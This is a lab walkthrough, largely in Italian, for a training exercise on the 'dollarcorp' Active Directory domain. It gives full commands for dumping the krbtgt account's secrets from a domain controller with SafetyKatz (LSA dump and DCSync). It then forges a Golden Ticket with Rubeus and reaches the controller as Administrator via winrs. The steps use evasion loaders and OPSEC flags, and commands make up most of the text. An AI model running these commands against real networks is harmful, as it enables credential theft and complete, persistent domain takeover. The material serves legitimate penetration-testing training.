# LEARNING OBJECTIVE8

<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

1. Extract secrets from the domain controller of dollarcorp.
2. Using the secrets of krbtgt account, create a Golden ticket.
3. &#x20;Use the Golden ticket to (once again) get domain admin privileges from\
   a machine.

### Svolgimento

Esegui il comando riportato di seguito da un prompt dei comandi con privilegi elevati (Esegui come amministratore) per avviare un processo con privilegi di amministratore di dominio:

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Esegui il seguente comando usando il nuovo prompt spawnato con Rubeus come DA per copiare il Loader sul dc

```powershell
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
```

<figure><img src="../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

Accediamo il DC&#x20;

```powershell
winrs -r:dcorp-dc cmd
```

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```powershell
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"

```

<figure><img src="../.gitbook/assets/image (14) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Abbiamo ottenuto l'NTLM del krbtgt,&#x20;

Per ottenere l'hash NTLM e le chiavi AES dell'account krbtgt, possiamo utilizzare l'attacco DCSync. Esegui il comando riportato di seguito dal processo in esecuzione come amministratore di dominio sulla VM dello studente:

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Forging Golden Ticket utilizzando Rubeus

Utilizza il comando Rubeus riportato di seguito per generare un comando compatibile con OPSEC per Golden Ticket. Tieni presente che vengono inviate 3 query LDAP al DC per recuperare le informazioni richieste.

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
```

Ora, usa il comando generato per creare un Golden ticket. Ricordati di aggiungere “-path C:\AD\Tools\Rubeus.exe -args” dopo Loader.exe e /ptt alla fine del comando generato per inserirlo nel processo corrente. Una volta inserito il ticket, possiamo accedere alle risorse nel dominio:

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:152 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Dopo aver importato il ticket correttamente possiamo acceder a dcorp-dc come Administrator usando winrs

```powershell
winrs -r:dcorp-dc cmd
```

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
